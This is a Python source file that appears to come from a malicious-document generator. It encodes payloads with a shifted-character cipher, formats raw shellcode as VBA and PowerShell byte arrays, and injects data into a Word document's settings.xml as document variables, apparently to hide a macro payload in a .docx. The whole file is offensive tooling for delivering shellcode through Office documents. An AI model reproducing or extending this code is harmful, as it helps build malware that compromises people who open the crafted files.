import re
import os
import zipfile
import sys
from rich.console import Console

console = Console()

def caesar_encrypt(text, shift=17):
    output = ""
    for char in text:
        val = ord(char) + shift
        output += f"{val:03d}"
    return output

def format_vba_shellcode(shellcode):
    vba_shellcode = ""
    # Use more bytes per line to avoid hitting the 25-line continuation limit in VBA
    bytes_per_line = 50 
    for i, byte in enumerate(shellcode):
        vba_shellcode += str(byte)
        if i < len(shellcode) - 1:
            vba_shellcode += ", "
        if (i + 1) % bytes_per_line == 0 and i < len(shellcode) - 1:
            vba_shellcode += "_ \n"
    return vba_shellcode

def format_ps1_shellcode(shellcode):
    return "0x" + ",0x".join(f"{b:02x}" for b in shellcode)

def inject_doc_vars_xml(content, doc_vars):
    """
    Injects Document Variables into the settings.xml content.
    """
    try:
        # Remove any existing docVars block to avoid duplication
        content = re.sub(r"<w:docVars>.*?</w:docVars>", "", content, flags=re.DOTALL)
        
        # Build new DocVars XML
        var_xml = "<w:docVars>"
        for name, value in doc_vars.items():
            # Robust XML escaping
            safe_val = value.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&apos;')
            var_xml += f'<w:docVar w:name="{name}" w:val="{safe_val}"/>'
        var_xml += "</w:docVars>"

        # Insert before the closing settings tag
        if "</w:settings>" in content:
            content = content.replace("</w:settings>", f"{var_xml}</w:settings>")
        elif "/>" in content: # Handle self-closing tags if they exist
            content = content.replace("/>", f">{var_xml}</w:settings>")
            
        return content
    except Exception as e:
        console.print(f"[bold red][-] Error processing XML: {e}[/bold red]")
        return content
